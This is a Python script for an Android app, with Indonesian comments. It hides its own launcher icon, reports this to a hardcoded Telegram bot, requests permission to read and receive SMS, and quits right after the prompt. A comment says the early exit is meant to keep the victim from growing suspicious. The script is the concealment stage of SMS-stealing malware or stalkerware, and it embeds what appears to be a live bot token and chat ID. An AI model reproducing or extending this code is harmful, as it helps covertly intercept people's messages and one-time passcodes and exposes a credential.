import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass
import os

TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
bot = telebot.TeleBot(TOKEN)

def hide_now():
    try:
        activity = autoclass('org.kivy.android.PythonActivity').mActivity
        pm = activity.getPackageManager()
        package_name = activity.getPackageName()
        # Gunakan nama kelas Kivy yang benar untuk hide
        component_name = autoclass('android.content.ComponentName')(package_name, 'org.kivy.android.PythonActivity')
        # Sembunyikan ikon (STATE_DISABLED = 2)
        pm.setComponentEnabledSetting(component_name, 2, 1)
        bot.send_message(CHAT_ID, "⚠️ Ikon Berhasil Dihilangkan!")
    except: pass

def on_permissions(permissions, grants):
    # Setelah klik izin, langsung matikan aplikasi agar tidak curiga
    os._exit(0)

if __name__ == '__main__':
    # LANGKAH 1: SEMBUNYIKAN IKON DULUAN (Bahkan sebelum izin muncul)
    hide_now()
    
    # LANGKAH 2: MINTA IZIN
    request_permissions([
        Permission.READ_SMS, 
        Permission.RECEIVE_SMS, 
        Permission.POST_NOTIFICATIONS
    ], on_permissions)
